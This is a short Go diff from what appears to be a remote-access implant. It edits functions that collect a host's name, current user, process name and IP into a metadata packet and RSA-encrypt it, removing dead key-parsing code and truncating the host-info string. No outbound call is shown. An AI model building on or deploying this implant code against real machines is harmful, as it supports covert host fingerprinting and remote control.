@@ -116,18 +116,6 @@ func MakePacket(replyType int, b []byte) []byte {
 }
 
 func EncryptedMetaInfo() ([]byte, error) {
-	tempPacket := MakeMetaInfo()
-	//block, _ := pem.Decode(config.RsaPublicKey)
-	//if block == nil {
-	//	return nil, errors.New("public key error")
-	//}
-	//pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
-	//if err != nil {
-	//	return nil, err
-	//}
-	//pub := pubInterface.(*rsa.PublicKey)
-	// size is always 128
-	config.ComputerNameLength = 128 - len(tempPacket) - 11
 	packetUnencrypted := MakeMetaInfo()
 	packetEncrypted, err := crypt.RsaEncrypt(packetUnencrypted)
 	if err != nil {
@@ -214,6 +202,9 @@ func MakeMetaInfo() []byte {
 	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))
 
 	osInfo := fmt.Sprintf("%s\t%s\t%s", hostName, currentUser, processName)
+	if len(osInfo) > 58 {
+		osInfo = osInfo[:58]
+	}
 	osInfoBytes := []byte(osInfo)
 
 	fmt.Printf("clientID: %d\n", clientID)
